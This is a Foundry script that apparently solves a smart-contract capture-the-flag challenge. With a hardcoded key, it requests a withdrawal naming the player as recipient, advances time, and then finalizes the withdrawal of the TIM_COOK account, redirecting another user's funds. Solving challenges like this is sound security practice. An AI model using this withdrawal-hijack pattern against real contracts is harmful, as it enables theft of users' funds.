// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";

import "src/Challenge.sol";

contract Solution is Script {
    function run() public {
        uint256 privateKey = 0x9ab0fe65575aa17213ff8d6ac83462d3932849aeb42ca70b0cb3e85d24feb7d9;
        address player = vm.addr(privateKey);
        
        Challenge challenge = Challenge(0x21474f7350Ea47e17229ed1a27B43D17992A8777);
        BigenLayer bigen = challenge.bigen();
        iPhone16 token = challenge.token();

        vm.startBroadcast(privateKey);

        // Step 1: Request withdrawal for TIM_COOK, but set the recipient as the player
        bigen.requestWithdrawal(16 * 10**18, player);

        // Step 2: Wait for 12 seconds
        vm.warp(block.timestamp + 13);

        // Step 3: Finalize withdrawal for TIM_COOK
        bigen.finalizeWithdrawal(challenge.TIM_COOK());

        vm.stopBroadcast();

        // Check if challenge is solved
        require(challenge.isSolved(), "Challenge not solved");
        console.log("Challenge solved!");
    }
}